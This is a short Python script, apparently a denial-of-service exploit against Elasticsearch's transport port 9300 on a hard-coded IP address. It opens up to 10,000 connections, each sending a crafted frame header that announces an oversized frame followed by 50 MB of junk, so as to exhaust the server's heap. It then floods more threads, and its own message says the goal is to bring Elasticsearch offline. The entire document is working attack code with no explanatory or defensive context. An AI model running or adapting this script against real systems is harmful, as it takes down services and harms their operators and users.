#!/usr/bin/env python3
import socket
from collections import defaultdict
import threading

host = '5.48.22.22'
port = 9300

def execute():
    socks = defaultdict()
    for i in range(1, 10000):
        socks[i] = send_payload()
        try:
            socks[i].recv(1)
        except ConnectionResetError:
            print("Ending heap space reached! Bringing Elasticsearch offline if isn't yet...")
            flood(connQty=20)
            break
        except BlockingIOError:
            pass
        print("Payload has been sent. Keeping %s connections." % i)

def send_payload():
    frame_size = b'\x45\x53\x0F\xFF\xFF\xF8'
    junk = b'A' * 50000000
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host, port))
    sock.send(frame_size)
    sock.send(junk)
    sock.setblocking(0)
    return sock

def flood(connQty=20):
    for i in range(connQty):
        thrd = threading.Thread(target=send_payload)
        thrd.start()


execute()